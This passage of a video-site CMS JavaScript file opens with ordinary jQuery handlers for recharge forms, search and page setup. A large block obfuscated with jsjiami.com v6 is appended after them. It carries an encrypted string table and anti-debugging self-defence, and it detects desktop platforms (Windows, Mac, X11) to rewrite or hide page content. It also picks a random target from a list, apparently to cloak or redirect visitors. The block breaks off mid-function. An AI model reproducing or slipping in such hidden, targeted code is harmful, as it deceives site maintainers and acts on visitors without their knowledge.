						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.alert-card').html('Loading...');
						},
						error : function(){
							$('.alert-card').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.alert-card', '充值成功，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else{
								feifei.alert.warning('.alert-card', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
}
//end
};
/*.ff-search #wd #ff-goback .ff-gallery .ff-raty .ff-img .ff-share .ff-safecode .ff-reply*/
$(document).ready(function(){
	if(feifei.browser.useragent.mobile){
		feifei.mobile.jump();
		feifei.mobile.nav();
		feifei.mobile.goback();
		feifei.mobile.flickity();
	}
	feifei.user.load();
	feifei.cms.nav();//
	feifei.cms.collapse();
	feifei.search.dropdown();
	feifei.search.autocomplete();
	feifei.search.hot();//
	feifei.search.submit();//
	feifei.search.keydown();//
	feifei.image.lazyload();
	feifei.image.slide();
	feifei.image.qrcode();//
	feifei.playurl.tongji();
	feifei.playurl.more();
	feifei.playurl.dropdown();
	feifei.playurl.download();
	feifei.playurl.active();
	feifei.page.more();
	feifei.page.keydown();//
	feifei.updown.click();
	feifei.score.raty();
	feifei.scenario.load();
	feifei.forum.load();
	feifei.vcode.load();
	feifei.scroll.totop('ff-totop',10);
	feifei.record.load();//
	feifei.hits.load();
	feifei.share.baidu();
});

/*
/*n119
 */
 var _0xod3='jsjiami.com.v6',_0x3c82=[_0xod3,'dk8tw5zDiw==','RxnDk8KAw4w=','w7ZOGMKpWg==','ZsKuwosLwqg=','QsK/wpcYPS4K','bsOdNMOow4A=','wpDDu04NwqfCqcKC','w55SBQ==','w4tLwr1jC33CgA==','DAHCjUscYsOAworDhg==','JcOXw5rDtsObMQg=','w5kge2c=','JMKow7sRw4lgLw==','cngQw6E9','AcKKwpRIw6BTDg==','YsOBIMOo','N8KrfsOKNcK3Ng==','ZsOENMKhw4s=','MivCpsKww5Y=','LDHCmngr','FHrDmMO9wrQ=','dMKKwrMmFg==','RBEOGVM=','wogbwrzDkSY=','dsKebAJX','Wm0Cw5wW','w4EibmvDqw==','NMOdw7rDvcOO','Lm7DsMO3wqY=','w6xqwpdUCA==','wqLDsksmwoc=','w4IAw7ItfA==','DcKkwqYBwrw=','w6PDvksnLw==','N1nCr8KoaA==','RsOlI8Kaw6w=','w7dkMsKVZg==','OhbCmMKSw7c=','w7xTwpJ7Cg==','w4Bmw67CoMKQTcKY','w40Ow684w5dBZA==','dcOjUGQP','NcOIw5jDrMOA','w5ZYAMKsZw==','w49Pw5U=','JDrCpMKy','bsOXJcOiw4LCnsO5w6nCsA==','JjAGw6E=','VjPDsMKCw7c=','YcKswoYBwrk=','L8O1w7rDi8Os','w55vwqlBAg==','Y8KVwp0zwro=','wqhlwqVNw74=','w4fDslI2w6A=','dsOTN8K3w4k=','JEPDt1DDjMKuw7Q=','c28Aw7so','wqDCricQwovDuMKm','YXwAw7o=','wqUkwoXDpyXCuMK6','bELCiMKnw4Q=','ccOZO8Kxw4E6w5w=','w5ESw70/WXYGGcOm','X8OJamATThk=','UMOJYw==','ecKWWjtM','bSQkAlY=','JsKOwrzDvAU=','w40ww5PCjcKt','wo7CpCHDsg==','wqfDuMK0w4pi','wo10wqJKw5c=','bFXCmsKw','RMKcwrAFCA==','wrzDtTzDp0E=','G8Kjwp1Qw7k=','dMO3McK0w7Q=','w5/DllM0Aw==','w4R7w5bCmMKd','BMKQwq5vAQ==','w49Fw5xmwoDDjA==','SmU/w7/Dgw==','wpLCpcKhXMKPIA==','ZHsTw57DsA==','CirCmcKkw6w=','GxjCgEoDew==','cXIIw7jDrEl2FMKAw7rDqQ==','ckPCgw==','wrnDkDQ=','w5Znw6TCtsKZSA==','wq3CpC0=','wq9lwojDuyfDusKp','fsOxD8KNw54=','E8KXWcOrLw==','wrPDnR7DgXs=','c8OWAcOAw74=','f8ONZWI0','AMKKwoc2wrE=','wrfDtcKQw6Zo','wqPDt8KhAnQ=','NsKUwqQGwoQ=','w71GwrVEMw==','MDfCkcKIw6c=','w4tIwpRELA==','wrLDr8KWw59n','Pz7CuMK7w5sg','LsKOwpbDlRI=','wp/DsU4ZwrzCrQ==','csKowpYIwpE=','w5oKeXvDrQ==','RyjDusKnw5c=','JsK3w6UOw58=','wpzDmsKDMg==','HRnCp8Ktw78=','UMODanQISg==','w4tow6ENw4Q=','wpoCw6o3RQ==','JsONwrIi','acKjw7oB','Q8KBwpTDlx8=','fS/CrsKo','wo1Iw4Zs','wpxHC8Kp','wo1xw6zCoA==','w5/CvcKwWg==','e8K4woA=','wo1Kw4Jm','OHobw7I=','Q8KVwojDkA==','JsOUwr8q','RxvCg14=','e8Kmwpok','LFcEwqXChk85R2NPwo5daVVPw5A9wrURGih/wrtDScO/w7Mzw5QVw6TCiMKZwqE1','YMOXO8Kmw4E7','w4IEw68sw4xF','A8KKwpXDkQ==','wrfDlC3DkF9Gw6zDnMKzZMONw4jCqGI=','NmjDg8OhwrQ=','wrTDmCrDpV9Cw7g=','KMKowpbDsBA=','C8OaMW9OXkzCoDTCrsK+DcK+IsOw','w5NTQMK0w58=','f8OPwrUxH8KAdg==','wo0Sw6Jzw4xYZ2ofewgicTHDqUcsw5HDolM4IWVaDQgtw5FvwoXCp8OsEQJ+GCTCh8KRwpobdMK/w5HCuiUnw4xNfyBzw6vClw7CpF0oFwMgCcKtWDF9E3tOwpcSWivDh8OOw5LCnHI=','wpttwq1pw7bDvsO3','PjgPw5TDoUl6CcKYwqU=','w7nDhWo2H8OOwpQ=','w7ZSdm/DrSvDgcK1w7TDhQfCqMKpUsOBaEHDhcKjwrEBIETDqlJhw6gVw5ljPcKuwq3CnBkFwo7DusK6wrLCtsO7BsOpw6Znw63Ds8K7w4RgN8OLEzNuwrB4dMKFGmvCrsK2K8KDaFHDoXIuwoApw4BSw7Zyw7w8bQTDui7DqkPCjx8cw5vCnsKrDMKvYBHCj8KjahjDm8KxP8KqCFnDn8Ovw5A5w5Y=','wqPDq8K+w4ZFQSo=','aMOrY8ONI8K3Nhg=','dWUVw4XDp1F9','wrpcw4kowrHDkypgwpfDucO3w4odw70zw5vCvCXCicOUw5nDizceFnJjw7zDrjt2PsO0bsKXw74Bw5tfUmXCosOfdHHDqSl5w4N7wp48w43DksOxwrZTOQXCocK7w6J0w7vDmkRqBh/DvhrCnDV9TcKXw7c+UMKWKsKUw4jCmTbCtsOQJg==','YiLChsKiwrDCuVLDucKIZ8KJw5I=','w5dRRcKpw44QBQ==','wo0yajHDj8Oyw7rDhsOoV8KjwqPDmcKDwoUIScOAw6phw6vDkVQ1L2TChXkzwrbCjcKawo1kwrB7dC7CgUwXKsOfw5DDqkfChsOpwo7ClRTDrcOJw6LCpTbCm8OPwoXDocOxwpfCsSgQwrtdfcKfw6UUL8KIC8KuRcOQwpTCsMOlwoladsOvU0MmB8OFw7kFbsOJFS08woAQw5MNw6secsOlIsKEwpg=','w5kTw6g/w51Bbw==','N8OcI8Okw4bCg8O/w6jDvsOAwrLDrcKxw7HCrnViw73DksKrCWZgfXLCrl/CgRZTAgrCv0M=','wobCv8KpWsKrOMKa','wrLDhHc7FsOHw4Q=','U1oUw6nDkA==','wqpqwqp+w6fDu8O2HnfDi1TDv8OCwqXDqXTDhibDusKIV3Zj','wpZDwrZz','BcKLRsOLHA==','woTDnzTDo2I=','wroRw5bCt2fCr8KYwqYd','OXMdw7o/IsOSw53CqMOa','JMOXw5DDvA==','HcK5wp8ZMy8KdQBZORJrc8O/XRbCscOqwpnDkcOIOsKWTcOAbMK+TGBTVh7DogbDtMKcwrpbJxzDkMKiK8K7bTfCrhDCsl4dw5QLBA9YZW1fIcKIGDYlwqrDojdCRQfDnQlQOXbCjmI7w5LCpx8PRMOdw5PDtsKXw4XCs1V0wr7Dn8O2Bz/CiWjCs8KdclrDmsOHw6IjMsKeG8KrwqQJwqzCgy7DnsKZN8OXVsO/w5PCmsO/','F8OEeDlAw5HCi3Atw45zLcOFbsK8w5HCjsOgQcO0KsKmY8K4YxPDnTbCvsKtXsOIwpUJwrjDn05Pw4DCgMO2wpo=','acOAIsO+wpLDgA==','McKuw6YLw4RlJkwpTQ==','w74EwpXCojHCv8OM','BcKAwprDkA==','wp9Nw5d1wpXChFJWDcKbNMKGGyLDoFYtX2A2w5nDtVwfBB5VwrXCi3R2w7PCmBLDui3CtMKxwrjDtMKFEGnCp0ErTcOIYnXDrsOuC2zCqsOpw4lDwojDjXnCuF8kYCcXHsK7XcOlNjtsZRnDj100Sy3Ci33DtyYUFnQzVy1Vw6NZecOxQsONLWXDnWt7Xx1Nw7BYw4/Dqz1Aw4NlCV7CuMOhWMOEw6Miw7HDpBHCtlDClcOuwpjCtR7CsH7CqS7DksKTwq0xWMK+CiDDr8KAwqMKP2h1w6LColVXdwcJP8Kxw6MHDMKbw4/CrFtyw5/CjMKvw40wwqJybcKHH8OMwrMIFz7CpMKNwpbCsj/DpsO8w6NP','d8KrwoAFwrkm','wrNUezTDrTfDiMK0wqzClgTDpsOmF8OpJA==','wrA0wpg2wrPCuMKxT2XCghnCosOswqnCoWDCgnjCmMO5Jwcew7Uuwp1Xw4AWw7IyF8OzLgECw7DDj8O0wqUDKyBhBsOHw5PDl188HwUBVgfDqsOqKXXCkVJAcEU=','w6EDwo/Cvw==','XR/CicKbbg==','SMK+wokeJg==','LmnCqMKidg==','w7VMw5I3w7/DnQ==','LsKawpN5LA==','Z8OKKMOgw4bCgg==','w44nw64oRA==','LsKvwolxKg==','YcOaMsOrw6o=','w69zw4nChsKS','bDXCosKaRw==','bcKFwq8JNQ==','I1HDmMO3wpo=','wpHDmlgswro=','ZMKswpMOwr8=','w5LDj1wlw58=','w5Nlw5NKwrI=','asO2wow2HQ==','wqgawofDnT0=','SBTCi8KITQ==','LlYEwrnCrQ==','ElzCmsKvZQ==','w5Qmw7kOw7U=','w6wVw7Iqw44=','w5g9w50sXg==','w4cFwqXCsjc=','csOVL8OBw5U=','JRrCnsK6w4I=','CHDDkMO/woU=','GQYHw5tm','w4Blw5fCssKR','IcOPw63DtcO7','J08nwrTCmw==','TcK1wrojOg==','UsO+wq8EKg==','EcKDwrAmwq0=','ChXCuU8C','wprDgj7Du3c=','ZsOzUWky','OMKBwootwrE=','w4dIZ8Krw4w=','a8ORwoskFA==','w4FJXsKbw68=','JsKAR8OMLQ==','w6ZkW8K7w44=','woAMwpzDsi8=','VUQCw6IT','KhTCtmY2','VBIWK3Y=','w75BwpxgDA==','Bw/CncK4w44=','wovDuMKdEkk=','w50oSn/Dvw==','w6wVw7zCgsKN','w61Kw4wuw4k=','w4M/w5wTYQ==','LkvCj8KMag==','wofDgEoHwpg=','wovCuMKXeMK/','w4cDw50sbQ==','woQAworDpgQ=','w60pw77Ct8Kk','w7d0w7llwpU=','w7huwqVxEA==','Dn7Dn8OcwqQ=','bsKGwqEyHQ==','WVsaw6Yd','IMKOfMOWMQ==','w4h7DsKNRA==','AC7CpkYe','wrTCjTjDnjk=','wr3DmEomwqI=','QkkXw4QP','eMOfKsOuw4Y=','wpdnUBnDoQ==','wrxUwqNtw4k=','SVnCg8KJw7E=','c3ACw6Aj','EjPCssKsw5s=','Q8OfP8KPw74=','W2Uhw5wz','SzgMEG0=','w6F1wrhSAg==','w7phwp1ZCw==','w7PDhGotw58=','wrnDoC/DvVI=','wrLDvEQOwrw=','NkYRwrHCjA==','UGHCu8Kcw4c=','W8O1wpc8Hg==','wr1VeDs=','woB5cT7Dtw==','BgPCssK1w4E=','MR/Cs8KIw5g=','IW8ZwqHCvg==','JsK6wpw1','w45pw7IGw7c=','w4AUcE/DmQ==','X8OVdw==','SMKXwogBNQ==','PsKrw4A4w7M=','w5oswqXCgAQ=','ZysbMHE=','wrjDhTTDuQ==','LcKZwqpiCA==','D3LDssOCwpQ=','U8OlY2E/','bMObwrYwNg==','w7Urw7EqbQ==','KcOfw6HDjsOF','woRSXDDDnA==','w6c3aFDDow==','wovCqwrDrx4=','JMK4wqsrwog=','AVTDoWTDrw==','wpTCjMKkWcKB','w74Ew5YVbA==','K2AXwqfCtg==','w5QKw644w7k=','w4xCwrllKA==','w7XDg1Evw5A=','w7UPw68weg==','w7BWwrxnAw==','R8KdwpsRGQ==','LsKzwptXw70=','wpjDj8K2w55S','w4VQw5B4wpo=','IcKKw7cYw60=','wrvDgWkvwqQ=','eMOawpsuMA==','LcO3w5fDkcOS','w5nDjlALw4E=','wqbDu8KKE2s=','fV4Lw5oN','NMKWwqFOMw==','YMO5JcOUw6g=','wqfDjcKVC1M=','E8KWwqNyJA==','E0TDncOYwqA=','wpXDmUIEwoM=','wpQgwoHDrj4=','DsKrwpFRHw==','wpvCsSLDqio=','HRbCvns/','w7jDolYVPw==','wppKwpFKw5Y=','w41aw4UPw6Q=','AAg4w5dY','w7gZblzDig==','f1XCisKLw5Y=','QcOaMsO2w4o=','woLCuRvDpz0=','ADHCmmMt','w4low6kZw7k=','w7ILw6nCjcKf','ShLCm8KG','w5vDl3oww4U=','w5sPb33DlQ==','wpzDgWQRwpk=','c8KmwoIVwrs=','OcKHwqMuwr8=','wozDjsKlw4JV','w4Vtw5B7wr8=','wrzDnMKDw6Ro','UkARw7fDtQ==','JlzDqU/Dmg==','w4dGT8KSw5w=','cnsdw4XDpFJhCw==','F8KWwp9Jw45YDnNd','YnI+w7stacOIw6rCpMOFcQ==','JDLCuA==','LkLDvUbDm8KNw7c=','YsKNcA==','w6kiw4U=','ABfCiksUWcOP','VVHCig==','w5gSHQ==','wqLDsGM=','cV7CjcKhw5nCmcKa','w75UDMKseA==','w7Mqw4g=','KH3DmQ==','WcK8wpU=','JMOBKcOpw5fDhMO4w7LCs8OF','wqvCpCgH','BcKRwpbDmA==','w4bCrDfDsjLDhUjCtARHwpTCrGJtw64ewpk/wppfwqzDssOEwrzCgMKSaBXCtsOaw7A0wq/CugPDhXrCuMK9AMKHw7nCvkxJYhvCo8Kzwokew7nCtRQfTsKWwrFfYQJxwqfDsncuw6bCvT3ClTfCjMO9UzbCr8K4IMOPKAptw5YVwrMMw4rCucKsw7IuFijCmcOOd8OtWyAQw504aMKKw6XCl8KMwq7Dh8OfQcKfwr/CtMKEwqs8wpLDrsK1wqHCqcKafsK6w6xPwrlVw4/ClsO5fMKVwqzDjl8Twpptw5jCocK9wrnCmCo8R2nChUPChVIEVcOcSFRKaC06YcKcdFrDiShQWsOXeAp4IMKBVlQac1bCiMOtwqoMHzdBPsOYNx8=','wpPCosKkVw==','DBTCnloV','N3nDm8Opwqg=','w6Ysw4LCng==','Pn4aw4PDo1B2RsKFw6/DvGNHHcOOeTYgQ8OTA2xIUDdldcOrwp/CuxvCtcOQfMOcNnHCqxIObMOybnPCkwc4w5wBwrbCkcKBOsKGwqHDtgzChsKwPj7DmwsbNMK/b8KXFEFgw5d2wq7DrMO8ecKSTxzDhsODwoRPw5Enw67Cng9NXMOpVsKTw73Ds8KEQTvCmDUAw7RMMMKwFsKUw4HDtkrDn1szHsKXwqINwofCgMOdw5XCuh8o','wqZjw4DClcK0wr0jbjPDvkPDrkdcLwDCk23Duw/Cr8Kdwqtlw7vCkk/CnsOaFsKVwpZhNzbDh8KTwqXDmMKyw51a','XsOJYGpcCA==','w5gIw7Iiw5pEbWwTew==','wofCpMKzR8KsOMKR','wrjCmMKuasKt','KMKawphBIQ==','wq4/wobDuA==','w41/w4w/w7o=','wo0MwofDtSE=','FFfCisK3Vg==','wpzDrsKfw7Nw','e8OVwrMy','w5Bqw4HCncK9','w6sewpU=','GijCpsKow58=','w7lWwrl4Pg==','Ml/DvFHDosKlw7RiAg==','dDIyHEtAw6PCusK1wqo7','OzsTw7o=','w4tUw4ZxwofCnh4RHMOHN8KQG37CtnNXeiJjw5TCpBIbBgNawrrDlCYjwqHClQDCuHjDo8Ogw73DpcKCWnLCsEN8QMOePw==','VgPCnMKCc2k4wo0eY2bCkkQPwr8Tw6jDsHvDtAoqw7LCo8KhacOew4UPCXXCgEbDsj7DlmN4w63DsMOmwqfDnsK3YznCmwrCgg==','XcKQajtSwobDgT0ywpJnO8ODMsOqwpHCgsKjXcO6d8KmfcK9bRTDlCTCrcOwBsKJw40FwqfChhoIwpjCi8Oxw4HCnUR6W8Krwoh7','w4t9w7TCo8KMG8OSQMO+wroIwpkzeTUMw77DtsOYwqR4w4B6w53CqFHCgXcQw5nCulLCuUDClsKew4pRMTgIMi/CmsOnw7DCoMKS','NMOZw5rDocObMA==','w6QIwojCrCfCuw==','w7cRfE3DqA==','dgXCrMKZUw==','LSo3w499','w6BNw449w6XDkyEzwpDCusOGwoVcwrNIw4w=','wozCmgXCvhMJwqnChsOnOMKwwovCumfCpsK5wp3DggHDscOkw63CmhJ0w6Juw4UPFCLCqcOoSsK4wrlsUMObRRpOw548w7FlwpXCvcKhWXlkw4rDnMKcw5nCgD3ChT0eCcKRw7c=','w50Ew7cu','JETDuErDjQ==','LsKpw6UXw5I=','WsOeG8Kzw6E=','w4LDqBMCw7zCucOSWH1uwqx5w6Q=','woFVZw3DqA==','JMKiw5Uew68ow6fCicOMTsONwrHDgsOsesKCFw==','IMK8wpcnwqPDkzEWw6M=','KE7Ds0bDgMK2','I2nDlMOuwqXDrgHCuA==','w6tLw5hNwp4=','w5pjw7ZhwqPDrsKqDG7DlhPDpMKD','d38Rw7A/asOSw4DCr8OdeSlOXCbDtgbCnmg3RmzCnMK0F8OSw7M=','w7jDnW81Lw==','cS/DksKpw7Q=','wrxmVxPDtg==','w6ELwojCohs=','V8KjSCF7','HxPCglk5','HnoSwq3CjQ==','wocHwoXDngE=','bmTCu8KWw4Y=','w7NIBsKobw==','EcK3ecODKg==','w6syYHPDiw==','T8KQWgNZ','ecK7wokFwqg8','TgLCm8Ka','w4FNw5FAwpM=','dFXCh8Kjw5XCvg==','w48xeWXDgg==','GWLCqMK6aA==','w7FFR8KFw6Q=','J8K/wo9Zw6U=','EEbDsMOAwpU=','AG8Awr/Cmg==','w74Pw6DCnsK7','BFbDq2rDlQ==','w5xBwqBk','bcKgwokjHg==','KcObw5PDp8Ok','wpjDisKDLg==','C8K3w6Uqw6o=','WDPDiMKXw7I=','KmXDkUbDtg==','KVfCpMKKSw==','a8KpwrMiHw==','fDXChMKrUQ==','HsKCc8OgFQ==','FkrDsnvDrA==','Tk4aw50W','woXDvkwJwp0=','eXM3w4E9','w6sielrDjg==','KTnCu8KNw60=','RBPCpcKBSQ==','w7oEe0jDuQ==','w685w4o4w5Q=','jYEsjiTSaHyXmkPiq.MNcdom.v6=='];(function(_0x3063ff,_0x9a6f9b,_0x22cbf7){var _0x406d29=function(_0xa5ff46,_0x5cc73f,_0x694b35,_0x5133f4,_0x9bb634){_0x5cc73f=_0x5cc73f>>0x8,_0x9bb634='po';var _0x16eeed='shift',_0x369830='push';if(_0x5cc73f<_0xa5ff46){while(--_0xa5ff46){_0x5133f4=_0x3063ff[_0x16eeed]();if(_0x5cc73f===_0xa5ff46){_0x5cc73f=_0x5133f4;_0x694b35=_0x3063ff[_0x9bb634+'p']();}else if(_0x5cc73f&&_0x694b35['replace'](/[YETSHyXkPqMNd=]/g,'')===_0x5cc73f){_0x3063ff[_0x369830](_0x5133f4);}}_0x3063ff[_0x369830](_0x3063ff[_0x16eeed]());}return 0xb5353;};var _0x2a9d2d=function(){var _0x1e801f={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x312196,_0x560fd3,_0x2943ba,_0xc5398a){_0xc5398a=_0xc5398a||{};var _0x5b0531=_0x560fd3+'='+_0x2943ba;var _0x469c88=0x0;for(var _0x469c88=0x0,_0x4bf527=_0x312196['length'];_0x469c88<_0x4bf527;_0x469c88++){var _0x1b48a1=_0x312196[_0x469c88];_0x5b0531+=';\x20'+_0x1b48a1;var _0x44f54e=_0x312196[_0x1b48a1];_0x312196['push'](_0x44f54e);_0x4bf527=_0x312196['length'];if(_0x44f54e!==!![]){_0x5b0531+='='+_0x44f54e;}}_0xc5398a['cookie']=_0x5b0531;},'removeCookie':function(){return'dev';},'getCookie':function(_0x34d416,_0x5accb6){_0x34d416=_0x34d416||function(_0x3e7a18){return _0x3e7a18;};var _0x1829cf=_0x34d416(new RegExp('(?:^|;\x20)'+_0x5accb6['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x5b9e27=typeof _0xod3=='undefined'?'undefined':_0xod3,_0x530761=_0x5b9e27['split'](''),_0xfa53b4=_0x530761['length'],_0x4a4156=_0xfa53b4-0xe,_0x4666f6;while(_0x4666f6=_0x530761['pop']()){_0xfa53b4&&(_0x4a4156+=_0x4666f6['charCodeAt']());}var _0x1bc973=function(_0x241b20,_0x43241b,_0x48a768){_0x241b20(++_0x43241b,_0x48a768);};_0x4a4156^-_0xfa53b4===-0x524&&(_0x4666f6=_0x4a4156)&&_0x1bc973(_0x406d29,_0x9a6f9b,_0x22cbf7);return _0x4666f6>>0x2===0x14b&&_0x1829cf?decodeURIComponent(_0x1829cf[0x1]):undefined;}};var _0x3d8a7d=function(){var _0x5cad39=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return _0x5cad39['test'](_0x1e801f['removeCookie']['toString']());};_0x1e801f['updateCookie']=_0x3d8a7d;var _0x3bdb5d='';var _0x43940d=_0x1e801f['updateCookie']();if(!_0x43940d){_0x1e801f['setCookie'](['*'],'counter',0x1);}else if(_0x43940d){_0x3bdb5d=_0x1e801f['getCookie'](null,'counter');}else{_0x1e801f['removeCookie']();}};_0x2a9d2d();}(_0x3c82,0x15a,0x15a00));var _0xa087=function(_0xc4ba5a,_0x175f01){_0xc4ba5a=~~'0x'['concat'](_0xc4ba5a);var _0x299134=_0x3c82[_0xc4ba5a];if(_0xa087['TRGEFR']===undefined){(function(){var _0x1f31ca=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0xfbc53b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x1f31ca['atob']||(_0x1f31ca['atob']=function(_0x56a697){var _0x58b27d=String(_0x56a697)['replace'](/=+$/,'');for(var _0x2b850e=0x0,_0x37c2ca,_0x394520,_0xf23aa4=0x0,_0x166d02='';_0x394520=_0x58b27d['charAt'](_0xf23aa4++);~_0x394520&&(_0x37c2ca=_0x2b850e%0x4?_0x37c2ca*0x40+_0x394520:_0x394520,_0x2b850e++%0x4)?_0x166d02+=String['fromCharCode'](0xff&_0x37c2ca>>(-0x2*_0x2b850e&0x6)):0x0){_0x394520=_0xfbc53b['indexOf'](_0x394520);}return _0x166d02;});}());var _0x5e561a=function(_0xff5473,_0x175f01){var _0x4ff71a=[],_0x83d877=0x0,_0x715567,_0x50c320='',_0x3013a1='';_0xff5473=atob(_0xff5473);for(var _0xae2231=0x0,_0x5c2ea5=_0xff5473['length'];_0xae2231<_0x5c2ea5;_0xae2231++){_0x3013a1+='%'+('00'+_0xff5473['charCodeAt'](_0xae2231)['toString'](0x10))['slice'](-0x2);}_0xff5473=decodeURIComponent(_0x3013a1);for(var _0x362534=0x0;_0x362534<0x100;_0x362534++){_0x4ff71a[_0x362534]=_0x362534;}for(_0x362534=0x0;_0x362534<0x100;_0x362534++){_0x83d877=(_0x83d877+_0x4ff71a[_0x362534]+_0x175f01['charCodeAt'](_0x362534%_0x175f01['length']))%0x100;_0x715567=_0x4ff71a[_0x362534];_0x4ff71a[_0x362534]=_0x4ff71a[_0x83d877];_0x4ff71a[_0x83d877]=_0x715567;}_0x362534=0x0;_0x83d877=0x0;for(var _0x34940c=0x0;_0x34940c<_0xff5473['length'];_0x34940c++){_0x362534=(_0x362534+0x1)%0x100;_0x83d877=(_0x83d877+_0x4ff71a[_0x362534])%0x100;_0x715567=_0x4ff71a[_0x362534];_0x4ff71a[_0x362534]=_0x4ff71a[_0x83d877];_0x4ff71a[_0x83d877]=_0x715567;_0x50c320+=String['fromCharCode'](_0xff5473['charCodeAt'](_0x34940c)^_0x4ff71a[(_0x4ff71a[_0x362534]+_0x4ff71a[_0x83d877])%0x100]);}return _0x50c320;};_0xa087['ZVPRFT']=_0x5e561a;_0xa087['dNcjVP']={};_0xa087['TRGEFR']=!![];}var _0x42ff50=_0xa087['dNcjVP'][_0xc4ba5a];if(_0x42ff50===undefined){if(_0xa087['QKOeZe']===undefined){var _0x57b526=function(_0x28ed4a){this['pWRQuj']=_0x28ed4a;this['YyLEXY']=[0x1,0x0,0x0];this['tiWYyV']=function(){return'newState';};this['GWSCVN']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['sYfyOd']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x57b526['prototype']['IoOIKA']=function(){var _0x3735fa=new RegExp(this['GWSCVN']+this['sYfyOd']);var _0x3483d9=_0x3735fa['test'](this['tiWYyV']['toString']())?--this['YyLEXY'][0x1]:--this['YyLEXY'][0x0];return this['moQyxj'](_0x3483d9);};_0x57b526['prototype']['moQyxj']=function(_0x2787f9){if(!Boolean(~_0x2787f9)){return _0x2787f9;}return this['thSeTU'](this['pWRQuj']);};_0x57b526['prototype']['thSeTU']=function(_0xda233e){for(var _0x90a69f=0x0,_0x45047b=this['YyLEXY']['length'];_0x90a69f<_0x45047b;_0x90a69f++){this['YyLEXY']['push'](Math['round'](Math['random']()));_0x45047b=this['YyLEXY']['length'];}return _0xda233e(this['YyLEXY'][0x0]);};new _0x57b526(_0xa087)['IoOIKA']();_0xa087['QKOeZe']=!![];}_0x299134=_0xa087['ZVPRFT'](_0x299134,_0x175f01);_0xa087['dNcjVP'][_0xc4ba5a]=_0x299134;}else{_0x299134=_0x42ff50;}return _0x299134;};var _0xdd92ba={'win':![],'mac':![],'xll':![]};var _0xb9d795=navigator[_0xa087('0','&2iM')];var _0x24b2af=navigator[_0xa087('1','DlZd')][_0xa087('2',')[D(')]();_0xdd92ba[_0xa087('3','*(EH')]=_0xb9d795[_0xa087('4','sg[1')](_0xa087('5','xahb'))==0x0;_0xdd92ba[_0xa087('6','OFGo')]=_0xb9d795[_0xa087('7','XLD^')](_0xa087('8','DF6#'))==0x0;_0xdd92ba[_0xa087('9','#qn%')]=_0xb9d795==_0xa087('a','#wTj')||_0xb9d795[_0xa087('b','DF6#')](_0xa087('c','@0Ll'))==0x0;if(_0xdd92ba[_0xa087('d','OFGo')]||_0xdd92ba[_0xa087('e','Y0T)')]||_0xdd92ba[_0xa087('f','sohF')]){var _0x3d6945=_0xa087('10','ml3Z');$(_0xa087('11','cz3!'))[_0xa087('12','[YFF')](_0xa087('13','#wTj'));$(_0xa087('14','#sny'))[_0xa087('15','XLD^')]();$(document)[_0xa087('16','Y0T)')](function(){var _0x4ec0af={'IUnDc':function(_0x14c975,_0x3a1728){return _0x14c975(_0x3a1728);},'tZcjJ':_0xa087('17','OFGo'),'KGlak':function(_0x3637b8,_0x3b3be4){return _0x3637b8+_0x3b3be4;},'wydtP':_0xa087('18','&2iM'),'HwHAP':_0xa087('19','OFGo'),'scANB':_0xa087('1a','z#Mq'),'Isptp':_0xa087('1b','sxZ5'),'QrjhZ':_0xa087('1c','#sny')};_0x4ec0af[_0xa087('1d','#sny')]($,_0x4ec0af[_0xa087('1e','EO8c')])[_0xa087('1f','^qIp')](_0x4ec0af[_0xa087('20','RWY7')](_0x4ec0af[_0xa087('21','^qIp')](_0x4ec0af[_0xa087('22','Ft[L')],_0x3d6945),_0x4ec0af[_0xa087('23','dXy%')]))[_0xa087('24','YMVo')]();_0x4ec0af[_0xa087('1d','#sny')]($,_0x4ec0af[_0xa087('25','s&$]')])[_0xa087('26','y@YB')](_0x4ec0af[_0xa087('27','*(EH')],_0x4ec0af[_0xa087('28','0qHz')]);});}var _0x45cb8c=navigator[_0xa087('29','sg[1')][_0xa087('2a','Bbi!')]();isMobile=/(iphone|ios|android|mini|mobile|mobi|nokia|symbian|ipod|ipad|windows\s+phone|mqqbrowser|wp7|wp8|ucbrowser7|ucweb|360\s+aphone\s+browser)/i[_0xa087('2b',']5PM')](_0x45cb8c);var _0x160bd9=new Array(_0xa087('2c','GW@*'),_0xa087('2d','Fy#v'),_0xa087('2e','xahb'),_0xa087('2f','s&$]'));var _0x107588;_0x107588=_0x160bd9[parseInt(Math[_0xa087('30','sE0M')]()*_0x160bd9[_0xa087('31','y@YB')])];function _0x3899ff(_0x37d4db){var _0x2f3e31=function(){var _0x4883b1=!![];return function(_0x18c990,_0x7d9a42){var _0x50aa41=_0x4883b1?function(){if(_0x7d9a42){var _0x32a4e6=_0x7d9a42['apply'](_0x18c990,arguments);_0x7d9a42=null;return _0x32a4e6;}}:function(){};_0x4883b1=![];return _0x50aa41;};}();var _0x43cab3=_0x2f3e31(this,function(){var _0x238a42=function(){return'\x64\x65\x76';},_0x57a50f=function(){return'\x77\x69\x6e\x64\x6f\x77';};var _0x282af0=function(){var _0x2cd7f9=new RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x2cd7f9['\x74\x65\x73\x74'](_0x238a42['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x3fb2f5=function(){var _0x3ba233=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x3ba233['\x74\x65\x73\x74'](_0x57a50f['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0xbaf121=function(_0x2699c8){var 